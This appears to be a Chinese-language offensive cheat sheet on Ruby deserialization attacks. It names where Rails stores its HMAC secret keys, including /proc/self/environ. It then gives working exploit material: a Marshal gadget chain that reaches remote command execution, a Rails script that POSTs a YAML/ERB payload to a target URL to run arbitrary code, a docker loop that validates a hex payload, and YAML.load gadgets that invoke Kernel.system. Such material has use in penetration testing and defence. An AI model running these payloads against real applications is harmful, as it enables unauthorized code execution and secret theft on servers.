# Ruby反序列化漏洞

为了保护序列化对象，Ruby 采用 HMAC（基于哈希的消息身份验证代码），确保数据的完整性和真实性。用于此目的的密钥存储在几个可能的位置之一：

+ config/environment.rb
+ config/initializers/secret_token.rb
+ config/secrets.yml
+ /proc/self/environ

## Ruby 2.X 通用反序列化到 RCE 小工具链
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
  def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
  def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
  def marshal_dump
    [$dependency_list]
  end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
  pipe.print payload
  pipe.close_write
  puts pipe.gets
  puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```

## Rails
```ruby
require "net/https"
require "uri"
require "base64"
require "rack"

url   = ARGV[0]
code  = File.read(ARGV[1])

# Construct a YAML payload wrapped in XML
payload = <<-PAYLOAD.strip.gsub("\n", "
")
<fail type="yaml">
--- !ruby/object:ERB
  template:
    src: !binary |-
      #{Base64.encode64(code)}
</fail>
PAYLOAD

# Build an HTTP request
uri = URI.parse(url)
http = Net::HTTP.new(uri.host, uri.port)
if uri.scheme == "https"
  http.use_ssl = true
  http.verify_mode = OpenSSL::SSL::VERIFY_NONE
end
request = Net::HTTP::Post.new(uri.request_uri)
request["Content-Type"] = "text/xml"
request["X-HTTP-Method-Override"] = "get"
request.body = payload

# Print the response
response = http.request(request)
puts "HTTP/1.1 #{response.code} #{Rack::Utils::HTTP_STATUS_CODES[response.code.to_i]}"
response.each { |header, value| puts "#{header}: #{value}" }
puts
puts response.body
```

## 针对 Ruby 2.0 到 2.5 生成并验证反序列化小工具链的脚本

```bash
for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load(["0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446"].pack("H*")) rescue nil'; done
```

## YAML.load

易受攻击的代码
```
require "yaml"
YAML.load(File.read("p.yml"))
```

ruby <= 2.7.2 的通用小工具
```
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
  - !ruby/object:Gem::Source::SpecificFile
    spec: &1 !ruby/object:Gem::StubSpecification
      loaded_from: "|id 1>&2"
  - !ruby/object:Gem::Source::SpecificFile
      spec:
```

ruby 2.x - 3.x 的通用小工具
```
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```
